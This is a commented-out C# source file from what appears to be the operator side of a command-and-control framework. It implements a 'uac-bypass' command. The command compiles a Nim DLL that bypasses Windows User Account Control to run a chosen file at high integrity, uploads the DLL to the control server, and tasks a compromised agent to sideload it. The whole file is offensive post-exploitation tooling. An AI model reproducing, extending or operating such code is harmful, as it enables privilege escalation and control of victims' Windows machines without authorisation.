/*using Commander.Commands.Agent;
using Commander.Commands.SideLoad;
using Commander.Communication;
using Commander.Executor;
using Commander.Internal;
using Commander.Terminal;
using System;
using System.Collections.Generic;
using System.CommandLine;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Commander.Commands.Module
{
    public class UACBypassCommandOptions
    {
        public string file { get; set; }
        public bool verbose { get; set; }
    }

    public class UACBypassCommand : EnhancedCommand<UACBypassCommandOptions>
    {
        public override string Description => "Site load a dll bypassing UAC and running file parameter as high integrity level";
        public override string Name => "uac-bypass";

        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;
        public virtual string ComputeParams(string innerParams)
        {
            return innerParams;
        }

        public override RootCommand Command => new RootCommand(this.Description)
        {
            new Argument<string>("file", () => string.Empty, "file to execute"),
            new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
        };

        protected override async Task<bool> HandleCommand(CommandContext<UACBypassCommandOptions> context)
        {
            context.Terminal.WriteLine($"[>] Generating uac bypass dll");
            string dllFileName = Guid.NewGuid().ToString()+ ".dll";
            string dllFullPath = Path.Combine(BuildHelper.TmpFolder, dllFileName);
            var parms = BuildHelper.ComputeNimBuildParameters("UAC", dllFullPath, true, false);

            parms.Insert(3, $"-d:Exec={context.Options.file}");

            if (context.Options.verbose)
                context.Terminal.WriteLine($"[>] Executing: nim {string.Join(" ", parms)}");
            var executionResult = BuildHelper.NimBuild(parms);
    
            if (context.Options.verbose)
                context.Terminal.WriteLine(executionResult.Out);
            if (executionResult.Result != 0)
            {
                context.Terminal.WriteError($"[X] Build Failed!");
                return false;
            }

            context.Terminal.WriteSuccess($"[*] Build succeed.");


            context.Terminal.WriteLine($"[>] Pushing {dllFileName} to the server...");

            byte[] fileBytes = null;
            using (FileStream fs = File.OpenRead(dllFullPath))
            {
                fileBytes = new byte[fs.Length];
                fs.Read(fileBytes, 0, (int)fs.Length);
            }

            bool first = true;
            var fileId = await context.CommModule.Upload(fileBytes, dllFileName, a =>
            {
                context.Terminal.ShowProgress("uploading", a, first);
                first = false;
            });

            context.Terminal.WriteLine($"[>] Deleting {dllFileName}...");
            File.Delete(dllFileName);
            //string fileName = Path.GetFileName(dllFileName);
            //context.Terminal.WriteLine(fileName);

            await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, EndPointCommand.SIDELOAD, fileId, dllFileName);
            context.Terminal.WriteSuccess($"[*] Command {this.Name} tasked to agent {context.Executor.CurrentAgent.Metadata.ShortId}.");
            return true;
        }

    }
}*/
